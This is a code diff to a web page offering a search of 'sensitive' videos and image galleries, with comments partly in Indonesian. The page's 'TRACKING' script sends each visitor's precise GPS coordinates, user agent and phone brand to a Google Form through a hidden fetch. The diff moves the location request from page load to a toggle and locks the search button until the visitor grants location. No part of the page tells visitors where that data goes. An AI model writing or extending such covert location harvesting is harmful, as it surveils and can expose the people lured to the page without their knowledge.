@@ -18,11 +18,10 @@ body {
 
 h1 { margin-top: 40px; }
 
-/* gambar awal kecil */
 .main-img {
   margin-top: 20px;
-  width: 130px;
-  height: 130px;
+  width: 120px;
+  height: 120px;
   border-radius: 18px;
   object-fit: cover;
 }
@@ -35,14 +34,32 @@ input {
   border: none;
 }
 
-button {
+.controls {
   margin-top: 12px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+
+button {
   padding: 10px 30px;
   border-radius: 10px;
   border: none;
-  background: white;
   font-weight: bold;
   cursor: pointer;
+}
+
+button:disabled {
+  background: #777;
+  color: black;
+  cursor: not-allowed;
+}
+
+.toggle {
+  font-size: 18px;
+  cursor: pointer;
+  color: #777;
+  user-select: none;
 }
 
 .warning {
@@ -82,7 +99,6 @@ button {
   cursor: pointer;
 }
 
-/* tombol slide */
 .nav-btn {
   position: absolute;
   bottom: -40px;
@@ -97,14 +113,13 @@ button {
 .nav-left { left: 0; }
 .nav-right { right: 0; }
 
-/* indikator */
 .indicator {
   margin-top: 10px;
   font-size: 18px;
   letter-spacing: 4px;
 }
 
-/* tombol telepon */
+/* TELEPON */
 .phone-btn {
   position: fixed;
   bottom: 20px;
@@ -135,7 +150,11 @@ button {
 <img class="main-img" src="https://files.catbox.moe/2sgujb.jpg">
 
 <input id="keyword" placeholder="Search">
-<button onclick="search()">SEARCH</button>
+
+<div class="controls">
+  <button id="searchBtn" onclick="search()" disabled>SEARCH</button>
+  <div id="toggle" class="toggle" onclick="toggleLocation()">•-/-•</div>
+</div>
 
 <div class="warning">This Web Is Sensitif⚠</div>
 
@@ -154,7 +173,9 @@ button {
 </a>
 
 <script>
-/* ================== TRACKING ================== */
+/* ================= TRACKING ================= */
+let locationGranted = false;
+
 function getBrand() {
   const ua = navigator.userAgent.toLowerCase();
   if (ua.includes("samsung")) return "Samsung";
@@ -168,44 +189,60 @@ function getBrand() {
 }
 
 function sendTracking(lat, lon) {
-  const formURL =
+  const url =
   "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse" +
   "?entry.138340134=" + lat.toFixed(6) +
   "&entry.1616098311=" + lon.toFixed(6) +
   "&entry.1257224602=" + encodeURIComponent(navigator.userAgent) +
   "&entry.1874088822=" + encodeURIComponent(getBrand());
 
-  fetch(formURL, { mode: "no-cors" });
+  fetch(url, { mode: "no-cors" });
 }
 
-navigator.geolocation.getCurrentPosition(
-  pos => sendTracking(pos.coords.latitude, pos.coords.longitude),
-  () => {},
-  { enableHighAccuracy: true }
-);
+function toggleLocation() {
+  if (locationGranted) return;
 
-/* ================== LIPZZ ================== */
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      locationGranted = true;
+      sendTracking(pos.coords.latitude, pos.coords.longitude);
+
+      const btn = document.getElementById("searchBtn");
+      btn.disabled = false;
+      btn.style.background = "white";
+
+      document.getElementById("toggle").style.color = "white";
+    },
+    () => {
+      alert("Lokasi wajib diaktifkan untuk SEARCH");
+    },
+    { enableHighAccuracy: true }
+  );
+}
+
+/* ================= LIPZZ ================= */
 let data = {};
 let currentImages = [];
 let currentIndex = 0;
 
 fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
-.then(res => res.json())
-.then(json => data = json);
+.then(r => r.json())
+.then(j => data = j);
 
 function search() {
+  if (!locationGranted) return;
+
   const key = keyword.value.trim().toLowerCase();
   if (!data[key]) return;
 
-  const box = modalBox;
-  box.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
+  modalBox.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
 
   if (data[key].type === "video") {
     const v = document.createElement("video");
     v.src = data[key].src;
     v.controls = true;
     v.autoplay = true;
-    box.appendChild(v);
+    modalBox.appendChild(v);
   }
 
   if (data[key].type === "gallery") {
@@ -215,24 +252,24 @@ function search() {
     const img = document.createElement("img");
     img.id = "gallery";
     img.src = currentImages[0];
-    box.appendChild(img);
+    modalBox.appendChild(img);
 
     const l = document.createElement("button");
     l.className = "nav-btn nav-left";
     l.innerText = "<";
     l.onclick = () => slide(-1);
-    box.appendChild(l);
+    modalBox.appendChild(l);
 
     const r = document.createElement("button");
     r.className = "nav-btn nav-right";
     r.innerText = ">";
     r.onclick = () => slide(1);
-    box.appendChild(r);
+    modalBox.appendChild(r);
 
     const ind = document.createElement("div");
     ind.className = "indicator";
     ind.id = "indicator";
-    box.appendChild(ind);
+    modalBox.appendChild(ind);
     updateIndicator();
   }
 
